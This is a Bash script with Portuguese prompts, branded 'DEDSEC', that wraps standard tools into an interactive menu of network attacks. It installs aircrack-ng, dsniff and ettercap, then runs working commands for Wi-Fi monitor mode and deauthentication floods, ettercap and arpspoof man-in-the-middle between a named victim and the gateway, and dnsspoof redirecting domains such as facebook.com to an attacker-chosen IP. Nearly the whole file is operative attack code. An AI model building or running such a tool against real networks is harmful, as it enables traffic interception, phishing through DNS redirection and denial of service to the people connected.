#!/bin/bash

clear

echo "  ____  _____ ____  ____  _____ ____ "
echo " |  _ \\| ____|  _ \\/ ___|| ____/ ___|"
echo " | | | |  _| | | | \\___ \\|  _|| |    "
echo " | |_| | |___| |_| |___) | |__| |___ "
echo " |____/|_____|____/|____/|_____\\____|"
echo "                                     "
echo ""

# Função para checar e instalar pacotes necessários
check_install() {
    local packages=("aircrack-ng" "dsniff" "ettercap-text-only" "arp-scan" "xterm" "net-tools")
    for pkg in "${packages[@]}"; do
        if ! dpkg -s "$pkg" &> /dev/null; then
            echo "Pacote '$pkg' não encontrado. Instalando..."
            sudo apt-get update -y
            sudo apt-get install -y "$pkg"
        else
            echo "Pacote '$pkg' já está instalado."
        fi
    done
}

check_install

# Função para listar interfaces de rede
listar_interfaces() {
    echo "Interfaces disponíveis:"
    interfaces=($(ip -o link show | awk -F': ' '{print $2}'))
    for i in "${!interfaces[@]}"; do
        echo "$i) ${interfaces[$i]}"
    done
    echo -n "Escolha a interface: "
    read idx
    IFACE="${interfaces[$idx]}"
    echo "Selecionado: $IFACE"
}

# Função para colocar em modo monitor
modo_monitor() {
    sudo airmon-ng start "$IFACE"
    MON_IFACE="${IFACE}mon"
}

# Função para rodar o airodump
airodump() {
    echo -n "Digite o canal (ou pressione Enter para todos): "
    read canal
    if [[ -z "$canal" ]]; then
        sudo airodump-ng "$MON_IFACE"
    else
        sudo airodump-ng --channel "$canal" "$MON_IFACE"
    fi
}

# Função de deauth
deauth() {
    echo -n "Digite o BSSID do alvo: "
    read bssid
    echo -n "Digite o MAC do cliente (ou 'ff:ff:ff:ff:ff:ff' para todos): "
    read client
    echo -n "Quantos pacotes de desautenticação? (0 = infinito): "
    read num
    python3 ascii.py
    sudo aireplay-ng --deauth "$num" -a "$bssid" -c "$client" "$MON_IFACE"
}

# MITM usando ettercap
mitm_ettercap() {
    echo "IPs na rede:"
    sudo arp-scan --interface="$IFACE" --localnet | grep -v "Interface:" | awk '{print $1, $2}'
    echo -n "Digite o IP da vítima: "
    read ip_vitima
    echo -n "Digite o IP do roteador/gateway: "
    read ip_gateway
    sudo ettercap -T -i "$IFACE" -M arp:remote /"$ip_vitima"/ /"$ip_gateway"/
    
}

# ARP Spoof com arpspoof
arp_spoof() {
    echo -n "Digite o IP da vítima: "
    read ip_vitima
    echo -n "Digite o IP do roteador/gateway: "
    read ip_gateway
    echo "[*] Rodando arpspoof entre $ip_vitima e $ip_gateway"
    echo "Use Ctrl+C para parar"
    xterm -hold -e "arpspoof -i $IFACE -t $ip_vitima $ip_gateway" &
    xterm -hold -e "arpspoof -i $IFACE -t $ip_gateway $ip_vitima" &
    python3 ascii.py "spoofing  "$ip_vitima" to "$ip_gateway" and VICE-VERSA using "$IFACE""
    wait
}

criar_spoof_file() {
    echo -n "Digite o nome do arquivo para salvar (ex: spoof.txt): "
    read arquivo
    echo "Criando arquivo $arquivo para spoof de DNS."
    echo "# Formato: dominio IP" > "$arquivo"
    echo "Você vai adicionar pares domínio → IP para redirecionamento."
    echo "Exemplo: facebook.com 192.168.1.100"
    echo "Quando a vítima tentar acessar o domínio, será redirecionada para o IP especificado."
    echo ""

    while true; do
        echo -n "Digite o domínio para spoof (ex: exemplo.com) (ou ENTER para terminar): "
        read dominio
        [[ -z "$dominio" ]] && break

        # Validação simples do domínio (pode ser melhorada)
        if [[ ! "$dominio" =~ ^[a-zA-Z0-9.-]+$ ]]; then
            echo "Formato de domínio inválido. Tente novamente."
            continue
        fi

        echo -n "Digite o IP para redirecionar $dominio (ex: 192.168.1.100): "
        read ip

        # Validação simples do IP
        if [[ ! "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            echo "Formato de IP inválido. Tente novamente."
            continue
        fi

        echo "$dominio $ip" >> "$arquivo"
        echo "Par \"$dominio\" será redirecionado para \"$ip\" adicionado."
        echo ""
    done

    echo "Arquivo $arquivo criado com sucesso."
    echo "Conteúdo do arquivo:"
    cat "$arquivo"
    echo ""
}

# DNS Spoof com dnsspoof
dns_spoof() {
    echo "==== DNS Spoof Menu ===="
    echo "1) Usar arquivo existente"
    echo "2) Criar novo arquivo spoof.txt"
    echo "3) Voltar"
    echo -n "Escolha uma opção: "
    read escolha

    case "$escolha" in
        1)
            echo -n "Digite o caminho do arquivo de spoofing (ex: spoof.txt): "
            read spoof_file
            ;;
        2)
            criar_spoof_file
            spoof_file="$arquivo"
            ;;
        *)
            echo "Voltando ao menu principal..."
            return
            ;;
    esac

    echo -n "Digite o IP da vítima (ou deixe vazio para todos): "
    read ip_vitima

    if [ -z "$ip_vitima" ]; then
        sudo dnsspoof -i "$IFACE" -f "$spoof_file"
        python3 ascii.py "spoofing  "$ip_vitima" using "$IFACE" and file:"$spoof_file"" 

    else
        sudo dnsspoof -i "$IFACE" -f "$spoof_file" host "$ip_vitima"
        python3 ascii.py "spoofing  "$ip_vitima" using "$IFACE""
    fi
}

# Menu principal
main_menu() {
    while true; do
        echo ""
        echo "==== MENU DE ATAQUES DE REDE ===="
        echo "1) Selecionar Interface"
        echo "2) Ativar Modo Monitor"
        echo "3) Airodump-ng"
        echo "4) Deauth (aireplay-ng)"
        echo "5) MITM com Ettercap"
        echo "6) ARP Spoof"
        echo "7) DNS Spoof (dnsspoof)"
        echo "8) Sair"
        echo "==============================="
        echo -n "Escolha uma opção: "
        read op

        case "$op" in
            1) listar_interfaces ;;
            2) modo_monitor ;;
            3) airodump ;;
            4) deauth ;;
            5) mitm_ettercap ;;
            6) arp_spoof ;;
            7) dns_spoof ;;
            8) echo "Saindo..."; break ;;
            *) echo "Opção inválida." ;;
        esac
    done
}

main_menu
